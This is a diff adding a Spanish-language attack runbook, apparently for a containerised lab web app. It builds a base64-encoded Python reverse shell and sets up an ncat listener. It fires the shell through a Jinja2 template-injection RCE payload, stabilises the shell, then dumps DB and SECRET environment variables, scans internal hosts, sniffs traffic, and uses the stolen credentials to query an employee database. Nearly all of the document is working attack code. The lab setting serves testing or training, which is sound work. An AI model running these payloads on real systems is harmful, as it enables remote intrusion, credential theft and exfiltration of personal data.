@@ -1,0 +1,78 @@
+# Construir payload:
+
+PAYLOAD_PY='import socket,subprocess,os;s=socket.socket();s.connect(("host.docker.internal",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+B64=$(printf '%s' "$PAYLOAD_PY" | base64)
+echo "$B64"
+
+Out: aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk=
+
+# Reverse shell:
+ncat -lvnp 4444
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm-256color
+export TZ=Europe/Madrid
+export PS1='[\D{%H:%M:%S}] root@webapp:\w\$ '
+stty rows 40 cols 120
+
+
+# Ejecutar RCE:
+
+{{ config.__class__.__init__.__globals__['os'].popen('echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk= | base64 -d | python3').read() }}
+
+
+# Estabilizar shell:
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export PS1='[\D{%H:%M:%S}] root@webapp:\w\$ '
+
+stty rows 40 cols 120
+clear
+
+
+# Copiar artefactos del contenedor al host:
+
+docker compose -f infra/perimetral/docker-compose.yaml \
+  cp webapp:/tmp/lateral.pcap   tests/logs/perimetral_sesion_$(date +%Y%m%d)_/lateral.pcap
+docker compose -f infra/perimetral/docker-compose.yaml \
+  cp webapp:/tmp/lateral.json   tests/logs/perimetral_sesion_$(date +%Y%m%d)/lateral.json
+docker compose -f infra/perimetral/docker-compose.yaml \
+  cp webapp:/tmp/creds.txt      tests/logs/perimetral_sesion_$(date +%Y%m%d)/creds.txt
+docker compose -f infra/perimetral/docker-compose.yaml \
+  cp webapp:/tmp/dump.txt       tests/logs/perimetral_sesion_$(date +%Y%m%d)/dump.txt
+docker compose -f infra/perimetral/docker-compose.yaml \
+  cp webapp:/tmp/e1_scan.log    tests/logs/perimetral_sesion_$(date +%Y%m%d)/e1_scan.log
+
+## o bien
+
+SESSION=$(ls -td tests/logs/perimetral_sesion_* | head -1)
+for f in lateral.pcap lateral.json creds.txt dump.txt e1_scan.log; do
+  docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/$f "$SESSION/$f"
+done
+ls -la "$SESSION"
+
+
+
+# T_exfil
+id
+hostname
+env | grep -E 'DB_|POSTGRES|SECRET' | tee /tmp/creds.txt
+
+# Superficie interna visible
+nmap -sT -Pn -p 22,80,443,5000,5432 --open backend db nginx 2>&1 | tee /tmp/e1_scan.log
+
+# Integridad del tráfico
+tcpdump -i any -w /tmp/lateral.pcap -c 50 host backend &
+sleep 1
+
+# T_lateral - Profundidad
+curl -s http://backend:5000/empleados | tee /tmp/lateral.json
+wc -c /tmp/lateral.json    # bytes fugados (parte de E2)
+
+# T_objetivo
+PGPASSWORD=$(grep DB_PASSWORD /tmp/creds.txt | cut -d= -f2) \
+  psql -h db -U $(grep -E '^DB_USER|^POSTGRES_USER' /tmp/creds.txt | head -1 | cut -d= -f2) \
+       -d $(grep -E '^DB_NAME|^POSTGRES_DB' /tmp/creds.txt | head -1 | cut -d= -f2) \
+       -c 'SELECT count(*) FROM empleados; SELECT * FROM empleados LIMIT 5;' \
+  | tee /tmp/dump.txt
+
+  
